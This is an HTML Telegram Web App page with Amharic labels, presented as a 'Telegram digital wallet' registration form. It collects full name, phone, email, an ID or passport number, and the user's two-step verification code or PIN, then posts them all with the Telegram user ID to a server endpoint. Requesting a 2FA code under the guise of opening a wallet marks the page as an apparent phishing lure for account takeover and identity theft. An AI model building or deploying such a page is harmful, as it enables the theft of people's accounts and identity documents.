<!DOCTYPE html>
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>የቴሌግራም ዲጂታል ዋሌት</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f9; padding: 20px; color: #333; }
        .container { max-width: 400px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input, select, button { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { background: #2481cc; color: white; border: none; font-weight: bold; cursor: pointer; }
        button:hover { background: #1b6ca8; }
    </style>
</head>
<body>
    <div class="container">
        <h2>የዋሌት ምዝገባ ቅጽ</h2>
        <form id="walletForm">
            <input type="text" id="full_name" placeholder="ሙሉ ስም" required>
            <input type="text" id="phone" placeholder="ስልክ ቁጥር" required>
            <input type="email" id="email" placeholder="ኢሜይል አድራሻ" required>
            <input type="text" id="id_document" placeholder="የመታወቂያ ወይም ፓስፖርት ቁጥር" required>
            <input type="text" id="two_fa" placeholder="2 - Step Verification (ኮድ ወይም ፒን)" required>
            <button type="button" onclick="submitRegistration()">ዋሌት ክፈት</button>
        </form>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        function submitRegistration() {
            let data = {
                telegram_id: tg.initDataUnsafe?.user?.id || "12345678",
                full_name: document.getElementById('full_name').value,
                phone: document.getElementById('phone').value,
                email: document.getElementById('email').value,
                id_document: document.getElementById('id_document').value,
                two_fa: document.getElementById('two_fa').value
            };

            fetch('/register', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(res => res.json())
            .then(response => {
                alert(response.message);
                tg.close();
            })
            .catch(err => alert("ስህተት ተፈጥሯል: " + err));
        }
    </script>
</body>
</html>
